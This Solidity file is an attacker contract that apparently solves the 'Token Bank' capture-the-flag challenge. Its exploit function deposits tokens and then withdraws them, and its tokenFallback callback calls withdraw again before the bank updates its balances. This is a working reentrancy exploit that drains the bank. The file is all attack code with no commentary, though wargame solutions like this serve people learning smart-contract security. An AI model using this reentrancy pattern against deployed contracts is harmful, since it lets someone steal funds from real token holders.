//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.4;
import "hardhat/console.sol";

interface ITokenBankChallenge {
    function token() external returns (address);

    function balanceOf(address account) external returns (uint256);

    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;
}

interface IERC223 {
    function balanceOf(address account) external returns (uint256);

    function transfer(address to, uint256 value)
        external
        returns (bool success);

    function transfer(
        address to,
        uint256 value,
        bytes memory data
    ) external returns (bool);
}

contract TokenBankAttacker {
    function exploit(address _challenge) external {
        address token = ITokenBankChallenge(_challenge).token();
        uint256 tokenBalance = IERC223(token).balanceOf(address(this));
        IERC223(token).transfer(_challenge, tokenBalance);

        uint256 bankBalance = ITokenBankChallenge(_challenge).balanceOf(
            address(this)
        );
        ITokenBankChallenge(_challenge).withdraw(bankBalance);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes memory
    ) external {
        uint256 a = IERC223(msg.sender).balanceOf(from);
        uint256 b = ITokenBankChallenge(from).balanceOf(address(this));

        if (a > 0) ITokenBankChallenge(from).withdraw(a <= b ? a : b);
    }
}
